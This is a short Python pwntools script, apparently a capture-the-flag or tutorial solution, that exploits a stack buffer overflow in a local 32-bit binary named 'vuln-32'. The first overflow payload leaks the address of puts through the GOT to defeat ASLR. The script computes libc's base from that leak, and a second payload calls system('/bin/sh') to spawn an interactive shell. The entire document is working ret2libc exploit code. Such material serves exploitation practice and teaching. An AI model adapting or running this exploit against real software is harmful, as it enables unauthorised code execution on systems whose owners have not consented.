from pwn import *


elf = context.binary = ELF("./vuln-32")
libc = elf.libc
p = process()

payload = flat(
    b"A" * 32,
    elf.plt["puts"],
    elf.sym["main"],
    elf.got["puts"],
)

p.recvline()
p.sendline(payload)
puts_addr =  u32(p.recv(4))


libc.address = puts_addr - libc.sym["puts"] 

payload = flat(
    b"A" * 32,
    libc.sym["system"],
    elf.sym["main"],
    next(libc.search("/bin/sh"))
)
p.sendline(payload)

p.interactive()